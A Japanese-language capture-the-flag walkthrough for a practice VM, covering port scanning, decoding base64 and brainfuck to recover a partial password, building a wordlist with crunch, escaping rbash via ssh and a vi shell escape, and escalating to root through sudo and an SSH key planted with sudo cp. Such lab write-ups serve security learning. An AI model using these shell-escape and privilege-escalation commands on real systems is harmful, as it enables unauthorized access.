### 論点
- crunch

### keyword
- brainfuck

## 攻略
- nmap
  - 22,80,31337
- webサイトを見る
  - 80ポートは特に何もない
  - 31337ポートのview sourceをみるとbase64がある
- gobusterしてみる
  - 31337ポートでするが、何も見つからない。assetsを見るとディレクトリリスティングになっている。ちなみに`vendors`とはphpなどのパッケージや管理ツールで作られる。ライブラリや外部パッケージを入れるもの
- base64でデコード
- サイトからファイルをダウンロード
  - brain fuckで解読。普通に探したサイトですると、時間がかかるので速いwebサイトの`online brainfuck compiler`を使う
- 解読すると、ユーザ名と`k1ll0rXX`がわかる。そこで最後の2文字はわからないというので、全ての組み合わせの辞書を作ることにする。ここでcrunchというコマンドを使うが、これは知ってないとわからない。
- `crunch 8 8 -t k1ll0r%@ -o dict.txt`
  - 8は最少数、8は最大数、%は数字、@は小文字
  - さっき全ての組み合わせの辞書を作ると書いたが、ここでは簡便に答えがわかっているのを前提に下一桁は小文字、二桁目は数字と指定して辞書を作る
- `guest:k1ll0r7n`　ちなみに、このユーザ名とパスワードの組み合わせをクレデンシャルと呼ぶらしい
- guestでsshに接続(解く方法は2種類ある)
  - (1)`ssh guest@$IP -t "bash --noprofile"`
  - (2)`ssh guest@$IP`
    - `echo $0`これで今使っているシェルがわかる
    - rbashが起動するのでbashが使えるようにする
    - `echo $PATH` -> `echo prog/*` -> viコマンドが使えるのがわかる。これはハッキングラボでやったのと同じGTFobinsで調べる。GTFOBinsには4つ方法があるが、ひとつづつ試していくしかない。ここでは
    - `vi -c ':!/bin/sh' /dev/null` 
- SUID
  - pkexecがある 
- sudo -l
  - 3つあるが、下のが一番簡単なので、これを利用する。/bin/cpはshenron1でやっているので参考にする 
  - (ALL) ALL
    - 次のでtrinityになれる
    - `sudo -u trinity bash -i`
    - `sudo su trinity` 
  - (追記) `/bin/cp`を使う
    - `ssh-keygen`で鍵を作る。全部enterでOK
    - `cp /home/guest/.ssh/id_rsa.pub /tmp` /tmpに鍵を移動させる
    - `cd tmp;chmod 644 id_rsa.pub` /tmpに移動して、trinityでも使えるように権限を変える
    - `sudo -u trinity /bin/cp id_rsa.pub /home/trinity/.ssh/authorized_keys`
    - `ssh trinity@localhost` 
- root
  - `sudo su`     

## 補足
- trinityになったときにプロンプトがないのは、`.bashrc`がないため
